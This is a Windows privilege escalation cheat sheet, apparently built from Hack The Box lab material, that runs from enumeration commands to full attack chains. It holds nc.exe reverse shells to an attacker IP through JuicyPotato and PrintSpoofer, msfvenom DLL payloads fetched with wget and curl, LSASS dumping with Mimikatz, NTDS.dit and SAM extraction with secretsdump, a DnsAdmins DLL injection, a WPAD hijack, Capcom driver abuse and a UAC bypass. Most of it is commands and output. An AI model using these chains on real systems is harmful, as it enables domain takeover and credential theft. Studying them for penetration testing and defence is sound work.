---
title: Windows Privilege Escalation Cheat Sheet
description: Everything to know about Privilege Escalation in a Windows Enviorment
date: 2024-08-22 11:33:00 +0800
categories: [Active Directory, Windows]
tags: [Privilege Escalation, Windows, Active Directory]
pin: true
math: true
mermaid: true
image:
  path: https://cdn.fs.teachablecdn.com/8uxbDYSqT6aiTScSQuw8
---












## **Enumeration**

### Network Information

``` batch
C:\htb> ipconfig /all
```

``` batch
C:\htb> arp -a
```

``` batch
C:\htb> route print
```
### Protections

#### Windows Defender

```powershell
PS C:\htb> Get-MpComputerStatus
```

#### AppLocker Rules

```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

##### Test AppLocker Policy

```powershell
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe
```

#### Get Password Policy & Other Account Information

``` batch
C:\htb> net accounts
```
### System Information

#### Tasklist (running processes)

``` batch
C:\htb> tasklist /svc
```

#### Environment Variables

``` batch
C:\htb> set
```

#### Configuration Information

``` batch
C:\htb> systeminfo
```

#### Patches and Updates (Hotfixes)

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the WMI-Command binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering) to display patches.

``` batch
C:\htb> wmic qfe
```

```powershell
PS C:\htb> Get-HotFix | ft -AutoSize
```

 Below are three separate commands we can use.
 
```powershell
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

We can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for `KB5000808` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.

#### Installed Programs

``` batch
C:\htb> wmic product get name
```

```powershell
PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version
```

Additional Commands To Confirm Program:

```powershell
PS C:\htb> get-process -Id {PID}
```

``` batch
C:\htb> netstat -ano | findstr {listening post of program}
```

```powershell
PS C:\htb> get-service | ? {$_.DisplayName -like '{program name}*'}
```

##### Get Installed Programs via PowerShell & Registry Keys

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                   DisplayVersion    InstallLocation
-----------                   --------------    ---------------
Adobe Acrobat DC (64-bit)      22.001.20169      C:\Program Files\Adobe\Acrobat DC\
```

#### Netstat (Display Running Processes)

The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside.

The main thing to look for with Active Network Connections are entries listening on loopback addresses (`127.0.0.1` and `::1`) that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`). The reason for this is network sockets on localhost are often insecure due to the thought that "they aren't accessible to the network."

``` batch
PS C:\htb> netstat -ano
```

### User & Group Information

#### Logged-In Users

``` batch
C:\htb> query user
```

#### Current User 

``` batch
C:\htb> echo %USERNAME%
```
#### Current User Privileges

``` batch
C:\htb> whoami /priv
```

#### Current User Group Information

``` batch
C:\htb> whoami /groups
```

#### Get All Users

``` batch
C:\htb> net user
```

#### Get All Groups

``` batch
C:\htb> net localgroup
```

#### Details About a Group (like members)

``` batch
C:\htb> net localgroup administrators
```
### Named Pipe

#### Listing Named Pipes with Pipelist

We can use the tool [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from the Sysinternals Suite to enumerate instances of named pipes.

``` batch
C:\htb> pipelist.exe /accepteula
```

#### Listing Named Pipes with PowerShell

```powershell
PS C:\htb>  gci \\.\pipe\
```

#### Named Pipes Attack (accesschk)

```
accesschk.exe -w \pipe\* -v
```

``` batch
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## **Windows User Privileges**

---

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access

---

### SeImpersonate Using - JuicyPotato

```shell-session
PrinceAli1@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

```shell-session
SQL> enable_xp_cmdshell
```

```shell-session
SQL> xp_cmdshell whoami
```

```shell-session
SQL> xp_cmdshell whoami /priv
```

#### Escalating Privileges Using JuicyPotato

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

### SeImpersonate Using - PrintSpoofer

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### SeDebugPrivilege

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

#### ProcDump/Manual Method & Mimikatz

``` batch
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

``` batch
C:\htb> mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

From the above we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

#### SeDebugPrivilege For RCE

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

> **Note**: The PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem 
{: .prompt-info }


```powershell
PS C:\htb> tasklist 
```

- Find process running as SYSTEM and note down there PID such as `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)


### SeTakeOwnershipPrivilege

#### Enabling SeTakeOwnershipPrivilege

We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
```

#### Choosing a Target File

Let's check out our target file to gather a bit more information about it.

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                   LastWriteTime         Attributes  Owner
--------                                   -------------         ----------  -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM   Archive
```

We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
1 File(s)             36 bytes
2 Dir(s)  17,079,754,752 bytes free
```

##### Files of Interest

Some local files of interest may include:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
#### Taking Ownership of the File

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

We can confirm ownership using the same command as before. We now see that our user account is the file owner.

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                          Owner
----     ---------                          -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

##### Modifying the File ACL

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

Let's grant our user full privileges over the target file.

```powershell
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```


## **Windows Built-in Groups**

### Backup Operators

Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.

The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.
#### Importing Libraries


```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Enabling SeBackupPrivilege

> **Note:** Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
{: .prompt-warning }

```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

#### Copying a Protected File

```powershell
PS C:\htb> dir C:\Confidential\

Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
```

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt
```

#### Attacking a Domain Controller - Copying NTDS.dit

This group also permits logging in locally to a domain controller.

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell
PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:
```

##### Copying NTDS.dit Locally

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

##### Backing up SAM and SYSTEM Registry Hives

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

``` batch
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```
##### Extracting Credentials from NTDS.dit - DSInternals

Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.

```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

##### Extracting Credentials from NTDS.dit - SecretsDump

```shell-session
PrinceAli1@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
### Event Log Readers

#### Password Searching In Logs

```cmd
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

We can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`.

``` batch
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```


####  Password Searching In Logs - Get-WinEvent


```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

> **Note:** Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.
{: .prompt-warning }

The cmdlet can also be run as another user with the `-Credential` parameter.

Other logs include [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.
### DnsAdmins

#### Generating Malicious DLL

We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.

```shell-session
PrinceAli1@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

```powershell
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

#### Loading Custom DLL

``` batch
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

> **Note:** We must specify the full path to our custom DLL or the attack will not work properly.
{: .prompt-warning }

#### Restarting DNS Service 

Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

If we do not have access to restart the DNS server, we will have to wait until the server or service restarts.


``` batch
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

``` batch
C:\htb> sc.exe sdshow DNS
```

``` batch
C:\htb> sc stop dns
```

``` batch
C:\htb> sc start dns
```

``` batch
C:\htb> net group "Domain Admins" /dom
```

#### Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.


#### WPAD Record

 Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack.
 
After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

##### Disabling the Global Query Block List

To set up this attack, we first disabled the global query block list:

```powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

##### Adding a WPAD Record

Next, we add a WPAD record pointing to our attack machine.

```powershell
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

### Print Operators

grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group.

It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.

> Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
{: .prompt-info }
#### Add Reference to Driver

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

``` batch
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```


#### Verify Driver is not Loaded

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

#### Verify Privilege is Enabled

Run the `EnableSeLoadDriverPrivilege.exe` binary.

``` batch
C:\htb> EnableSeLoadDriverPrivilege.exe
```

#### Verify Capcom Driver is Listed

Next, verify that the Capcom driver is now listed.

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

#### Use ExploitCapcom Tool to Escalate Privileges

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell
PS C:\htb> .\ExploitCapcom.exe
```

#### Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.



#### Automating with EopLoadDriver

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

``` batch
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.
### Server Operators

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

#### Service running in SYSTEM but we have Privileges

##### Querying the AppReadiness Service

Let's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.

``` batch
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
```


##### Checking Service Permissions with PsService

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service.


``` batch
C:\htb> c:\Tools\PsService.exe security AppReadiness
```

This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

#### Modifying the Service Binary Path (Add user to admin group)

Let's change the binary path to execute a command which adds our current user to the default local administrators group.

``` batch
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

Starting the service fails, which is expected. - **It worked**

``` batch
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

If we check the membership of the administrators group, we see that the command was executed successfully.

``` batch
C:\htb> net localgroup Administrators
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```
#### Local Admin Group Membership Attacks

From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

```shell-session
PrinceAli1@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

```shell-session
PrinceAli1@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

## **Attacking the OS**

### User Account Control

#### Confirming UAC is Enabled

There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.

``` batch
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

``` batch
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

#### Checking Windows Version

UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.

The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.

```
Author: egre55

- Type: Dll Hijack
- Method: Dll path search abuse
- Target(s): \syswow64\SystemPropertiesAdvanced.exe and other SystemProperties*.exe
- Component(s): \AppData\Local\Microsoft\WindowsApps\srrstr.dll
- Implementation: ucmEgre55Method
- Works from: Windows 10 (14393)
- Fixed in: Windows 10 19H1 (18362)
    - How: SysDm.cpl!_CreateSystemRestorePage has been updated for secured load library call
- Code status: removed starting from v3.5.0 🚜
```

#### 1. Reviewing Path Variable

Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.

```powershell
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.
#### 2. Generating Malicious srrstr.dll DLL

```shell-session
PrinceAli1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

```powershell
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### 3. Testing Connection

If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.

``` batch
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

#### 4. Executing SystemPropertiesAdvanced.exe on Target to bypass UAC

``` batch
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.


### Weak Permissions

The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications

Notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.

---
#### Permissive File System ACLs
##### Running SharpUp

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

##### Checking Permissions for service with icacls

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe 
BUILTIN\Users:(I)(F)
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
##### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

``` batch
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

#### Weak Service Permissions

##### Reviewing SharpUp Again

Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.

``` batch
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
